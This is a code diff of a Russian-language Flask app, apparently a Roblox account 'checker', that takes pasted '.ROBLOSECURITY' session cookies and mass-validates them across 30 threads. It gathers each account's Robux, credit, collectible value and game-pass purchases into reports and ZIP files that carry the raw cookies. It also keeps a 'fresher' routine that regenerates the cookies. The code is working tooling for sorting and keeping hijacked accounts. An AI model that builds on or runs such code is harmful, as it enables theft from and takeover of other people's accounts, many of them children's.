@@ -16,6 +16,16 @@ app.config['SECRET_KEY'] = 'kai_checker_secret_key_pro'
 CHECKER_HISTORY_FILE = "checker_history.json"
 FRESHER_HISTORY_FILE = "fresher_history.json"
 
+# ========== ОСНОВНЫЕ ИГРЫ (ТОЛЬКО ИХ ПОКАЗЫВАЕМ) ==========
+MAIN_GAMES = [
+    'Adopt Me', 'Blox Fruits', 'Murder Mystery 2', 'Rivals',
+    'Pet Simulator 99', 'Pet Simulator X', 'Arsenal', 'BedWars',
+    'Tower Defense Simulator', 'Anime Adventures', 'Anime Vanguards',
+    'King Legacy', 'Shindo Life', 'Project Slayers', 'Demon Slayer RPG 2',
+    'Dragon Ball Rage', 'Fisch', 'Jujutsu Shenanigans'
+]
+
+# ==================== HTML ТЕМПЛЕЙТ ====================
 HTML = r"""<!DOCTYPE html>
 <html lang="ru" data-theme="dark">
 <head>
@@ -47,9 +57,11 @@ HTML = r"""<!DOCTYPE html>
             --text-muted: #7e22ce;
             --accent-purple: #7e22ce;
             --accent-pink: #c026d3;
+            --accent-glow: rgba(126, 34, 206, 0.15);
         }
         * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
         body { font-family: 'Plus Jakarta Sans', sans-serif; min-height: 100vh; background: var(--bg); color: var(--text-main); position: relative; overflow-x: hidden; padding: 24px 16px; }
+        #particles-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; pointer-events: none; }
         .bg-glow { position: fixed; width: 500px; height: 500px; background: radial-gradient(circle, rgba(168, 85, 247, 0.12) 0%, rgba(0,0,0,0) 70%); top: -100px; left: 50%; transform: translateX(-50%); z-index: 0; pointer-events: none; animation: pulseGlow 8s infinite alternate ease-in-out; }
         @keyframes pulseGlow { 0% { transform: translateX(-50%) scale(1); opacity: 0.5; } 100% { transform: translateX(-50%) scale(1.2); opacity: 0.8; } }
         .wrapper { max-width: 1350px; margin: 0 auto; position: relative; z-index: 1; background: var(--bg-card); border: 1px solid var(--border-card); backdrop-filter: blur(20px); border-radius: 28px; padding: 32px; box-shadow: 0 20px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05); }
@@ -60,7 +72,7 @@ HTML = r"""<!DOCTYPE html>
         .stat-card { background: var(--input-bg); border: 1px solid var(--border-card); padding: 8px 16px; border-radius: 16px; display: flex; flex-direction: column; align-items: center; min-width: 90px; }
         .stat-val { font-size: 16px; font-weight: 800; color: var(--accent-pink); }
         .stat-lbl { font-size: 10px; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }
-        .tabs { display: flex; gap: 12px; margin-bottom: 32px; background: var(--input-bg); padding: 8px; border-radius: 22px; border: 1px solid var(--border-card); width: fit-content; flex-wrap: wrap; }
+        .tabs { display: flex; gap: 12px; margin-bottom: 32px; background: var(--input-bg); padding: 8px; border-radius: 22px; border: 1px solid var(--border-card); width: fit-content; flex-wrap: wrap; box-shadow: 0 8px 30px rgba(0,0,0,0.25); }
         .tab { padding: 14px 32px; border-radius: 16px; color: var(--text-muted); cursor: pointer; font-size: 15px; font-weight: 700; transition: all 0.3s; border: 1px solid transparent; background: transparent; }
         .tab:hover { color: var(--text-main); background: rgba(168, 85, 247, 0.1); border-color: rgba(168, 85, 247, 0.2); }
         .tab.active { background: var(--gradient-btn); color: #fff; border-color: rgba(255, 255, 255, 0.15); box-shadow: 0 6px 18px var(--accent-glow); }
@@ -71,7 +83,7 @@ HTML = r"""<!DOCTYPE html>
         .card h2 { font-size: 16px; font-weight: 800; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
         .btn { padding: 12px 24px; border: none; border-radius: 14px; font-size: 13px; font-weight: 700; cursor: pointer; color: #fff; display: inline-flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.25s; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
         .btn-primary { background: var(--gradient-btn); }
-        .btn-primary:hover { opacity: 0.9; transform: translateY(-1px); }
+        .btn-primary:hover { background: linear-gradient(135deg, #9333ea 0%, #c026d3 100%); box-shadow: 0 4px 15px var(--accent-glow); transform: translateY(-1px); }
         .btn-secondary { background: var(--input-bg); border: 1px solid var(--border-card); color: var(--text-muted); }
         .btn-secondary:hover { color: var(--text-main); border-color: var(--accent-purple); }
         .btn-danger { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; }
@@ -87,7 +99,7 @@ HTML = r"""<!DOCTYPE html>
         .action-btn-group { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
         .btn-toggle-box, .btn-download-txt, .btn-download-zip { background: rgba(217, 70, 239, 0.15); border: 1px solid rgba(217, 70, 239, 0.3); color: var(--accent-pink); padding: 4px 12px; border-radius: 8px; font-size: 11px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
         .btn-toggle-box:hover, .btn-download-txt:hover, .btn-download-zip:hover { background: rgba(217, 70, 239, 0.3); box-shadow: 0 0 8px var(--accent-glow); }
-        .result-box { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; padding: 14px; max-height: 500px; overflow-y: auto; font-family: monospace; font-size: 12px; color: var(--text-main); white-space: pre-wrap; word-break: break-all; margin-top: 6px; }
+        .result-box { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; padding: 14px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; color: var(--text-main); white-space: pre-wrap; word-break: break-all; margin-top: 6px; }
         .progress-bar { margin-top: 12px; background: var(--input-bg); border-radius: 20px; height: 8px; overflow: hidden; border: 1px solid var(--border-card); }
         .progress-fill { height: 100%; width: 0%; background: var(--gradient-btn); transition: width 0.3s ease; }
         .progress-text { font-size: 12px; color: var(--text-muted); margin-top: 4px; text-align: center; }
@@ -112,6 +124,7 @@ HTML = r"""<!DOCTYPE html>
     </style>
 </head>
 <body>
+<canvas id="particles-canvas"></canvas>
 <div class="bg-glow"></div>
 <div id="custom-alert" class="custom-alert-overlay">
     <div class="custom-alert-card">
@@ -327,6 +340,10 @@ async function runMassCheck() {
             document.getElementById('statValid').textContent = data.valid_count || 0;
             document.getElementById('statRobux').textContent = (data.total_robux || 0).toLocaleString();
             document.getElementById('statPremium').textContent = data.premium_count || 0;
+            // Сохраняем отчеты для ZIP
+            if (data.reports) {
+                lastMassReports = data.reports;
+            }
         } else {
             showAlert(data.message || 'Ошибка');
         }
@@ -503,7 +520,7 @@ def save_fresher_history_entry(mode, refreshed_count, usernames, cookies):
     })
     write_json_file(FRESHER_HISTORY_FILE, history)
 
-# ==================== ОСНОВНАЯ ЛОГИКА ====================
+# ==================== ЧИСТКА КУКИ ====================
 def clean_cookie(cookie_str):
     cookie_str = cookie_str.strip()
     if "_|WARNING:-DO-NOT-SHARE-THIS." in cookie_str:
@@ -512,13 +529,9 @@ def clean_cookie(cookie_str):
             return match.group(1)
     return cookie_str
 
-def get_game_purchases(user_id, cookie):
+# ==================== ПОЛУЧЕНИЕ ПОКУПОК (ВСЕ ИГРЫ) ====================
+def get_all_purchases(user_id, cookie):
     headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
-    TARGET_GAMES = [
-        'Adopt Me', 'Blox Fruits', 'Murder Mystery 2', 'Rivals',
-        'Pet Simulator 99', 'Pet Simulator X', 'Arsenal', 'BedWars',
-        'Tower Defense Simulator', 'Anime Adventures'
-    ]
     purchases_by_game = {}
     total_spent = 0
     try:
@@ -534,17 +547,10 @@ def get_game_purchases(user_id, cookie):
             data = r.json()
             for item in data.get('data', []):
                 price = abs(item.get('currency', {}).get('amount', 0))
-                if price < 10:
+                if price < 100:   # Игнорируем донаты меньше 100
                     continue
                 game_name = item.get('details', {}).get('place', {}).get('name', 'Другие игры')
                 item_name = item.get('details', {}).get('name', 'Товар')
-                matched = False
-                for target in TARGET_GAMES:
-                    if target.lower() in game_name.lower() or game_name.lower() in target.lower():
-                        matched = True
-                        break
-                if not matched:
-                    continue
                 if game_name not in purchases_by_game:
                     purchases_by_game[game_name] = []
                 purchases_by_game[game_name].append({'name': item_name, 'price': price})
@@ -558,6 +564,62 @@ def get_game_purchases(user_id, cookie):
         pass
     return purchases_by_game, total_spent
 
+# ==================== ФОРМИРОВАНИЕ ОТЧЁТА ====================
+def format_game_purchases(game_purchases):
+    """Формирует список игр и геймпассов только из MAIN_GAMES"""
+    if not game_purchases:
+        return "❌ Геймпассов не найдено"
+    
+    # Фильтруем только основные игры
+    filtered = {}
+    for game, passes in game_purchases.items():
+        for target in MAIN_GAMES:
+            if target.lower() in game.lower() or game.lower() in target.lower():
+                filtered[game] = passes
+                break
+    if not filtered:
+        return "❌ Геймпассов в основных играх не найдено"
+    
+    sorted_games = sorted(filtered.items(), key=lambda x: sum(p['price'] for p in x[1]), reverse=True)
+    result = ""
+    for game, passes in sorted_games[:10]:  # максимум 10 игр в отчёте
+        total = sum(p['price'] for p in passes)
+        result += f"\n  🎮 {game} — {len(passes)} гп, ⏣ {total:,}"
+        for p in passes[:3]:
+            result += f"\n     └─ {p['name']} — ⏣ {p['price']:,}"
+        if len(passes) > 3:
+            result += f"\n     └─ ... и ещё {len(passes) - 3}"
+    return result
+
+def format_single_report(info):
+    if not info:
+        return "❌ Невалидный кук или ошибка запроса"
+    
+    prem_str = "Да" if info["is_premium"] else "Нет"
+    
+    report = f"""========================================
+👤 АККАУНТ: {info['username']} ({info['display_name']})
+========================================
+🆔 ID: {info['user_id']}
+📅 Дата регистрации: {info['created_date']}
+⭐ Premium: {prem_str}
+💵 Robux: {info['robux']:,}
+⏳ Pending Robux: {info['pending_robux']:,}
+💳 Баланс / Credit: ${info['credit']}
+💎 RAP: {info['rap']:,}
+========================================
+📦 ГЕЙМПАССЫ (основные игры):
+"""
+    games_text = format_game_purchases(info['game_purchases'])
+    report += games_text
+    report += f"""
+========================================
+🍪 Кук:
+{info['cookie']}
+========================================"""
+    return report
+
+# ==================== ПОЛУЧЕНИЕ ДАННЫХ АККАУНТА ====================
 def get_account_data(cookie):
     cookie = clean_cookie(cookie)
     headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
@@ -594,7 +656,7 @@ def get_account_data(cookie):
     res_cred = requests.get("https://billing.roblox.com/v1/credit", headers=headers)
     if res_cred.status_code == 200:
         credit = f"{res_cred.json().get('balance', 0):.2f}"
-    game_purchases, game_total_spent = get_game_purchases(user_id, cookie)
+    game_purchases, game_total_spent = get_all_purchases(user_id, cookie)
     return {
         "user_id": user_id, "username": username, "display_name": display_name,
         "robux": robux, "pending_robux": pending_robux, "credit": credit,
@@ -602,43 +664,7 @@ def get_account_data(cookie):
         "cookie": cookie, "game_purchases": game_purchases, "game_total_spent": game_total_spent
     }
 
-def format_single_report(info):
-    if not info:
-        return "❌ Невалидный кук или ошибка запроса"
-    prem_str = "Да" if info["is_premium"] else "Нет"
-    report = f"""========================================
-👤 АККАУНТ: {info['username']} ({info['display_name']})
-========================================
-🆔 ID: {info['user_id']}
-📅 Дата регистрации: {info['created_date']}
-⭐ Premium: {prem_str}
-💵 Robux: {info['robux']:,}
-⏳ Pending Robux: {info['pending_robux']:,}
-💳 Баланс / Credit: ${info['credit']}
-💎 RAP (Коллекционка): {info['rap']:,}
-========================================
-📦 ГЕЙМПАССЫ (популярные игры):
-"""
-    if info['game_purchases']:
-        sorted_games = sorted(info['game_purchases'].items(), key=lambda x: sum(p['price'] for p in x[1]), reverse=True)
-        for game, passes in sorted_games:
-            total = sum(p['price'] for p in passes)
-            report += f"\n  🎮 {game} — {len(passes)} гп, ⏣ {total:,}"
-            for p in passes[:3]:
-                report += f"\n     └─ {p['name']} — ⏣ {p['price']:,}"
-            if len(passes) > 3:
-                report += f"\n     └─ ... и ещё {len(passes) - 3}"
-        report += f"\n\n💰 Всего потрачено на геймпассы: ⏣ {info['game_total_spent']:,}"
-    else:
-        report += "\n  ❌ Геймпассов в популярных играх не найдено"
-    report += f"""
-========================================
-🍪 Кук:
-{info['cookie']}
-========================================"""
-    return report
-
-# ==================== ФРЕШЕР ИЗ MEOW TOOL ====================
+# ==================== ФРЕШЕР (MEOW TOOL) ====================
 def refresh_cookie_action(cookie, mode="duplicate"):
     cookie = clean_cookie(cookie)
     result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
@@ -740,7 +766,7 @@ def mass_check():
     premium_count = 0
     usernames = []
     full_reports = []
-    lastMassReports = []
+    zip_reports = []   # для ZIP (полные отчёты)
     
     with ThreadPoolExecutor(max_workers=30) as executor:
         future_to_cookie = {executor.submit(get_account_data, c): c for c in cookies}
@@ -752,14 +778,13 @@ def mass_check():
                 if info["is_premium"]:
                     premium_count += 1
                 usernames.append(info["username"])
-                rep = format_single_report(info)
-                full_reports.append(rep)
-                lastMassReports.append(rep)
+                # Отчёт для интерфейса (короткий, только основные игры)
+                rep_short = format_single_report(info)
+                full_reports.append(rep_short)
+                # Отчёт для ZIP (полный, но только основные игры, т.к. format_single_report уже фильтрует)
+                zip_reports.append(rep_short)
     
-    # Сохраняем в глобальную переменную для ZIP
-    global mass_reports_cache
-    mass_reports_cache = [{"report": r, "username": re.search(r'👤 АККАУНТ:\s*([^\n\r]+)', r).group(1).split('(')[0].strip() if re.search(r'👤 АККАУНТ:\s*([^\n\r]+)', r) else f"acc_{i}"} for i, r in enumerate(full_reports)]
-    
+    # Сводка
     summary = f"""📊 ОТЧЁТ О ПРОВЕРКЕ
 ══════════════════════════════════════════════════════
 
@@ -779,7 +804,8 @@ def mass_check():
         "message": summary,
         "valid_count": valid_count,
         "total_robux": total_robux,
-        "premium_count": premium_count
+        "premium_count": premium_count,
+        "reports": zip_reports   # для ZIP
     })
 
 mass_reports_cache = []
@@ -789,7 +815,7 @@ def download_zip():
     data = request.json or {}
     reports = data.get('reports', [])
     if not reports:
-        reports = [r["report"] for r in mass_reports_cache]
+        return jsonify({"success": False, "message": "Нет отчетов"})
     
     memory_file = io.BytesIO()
     with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
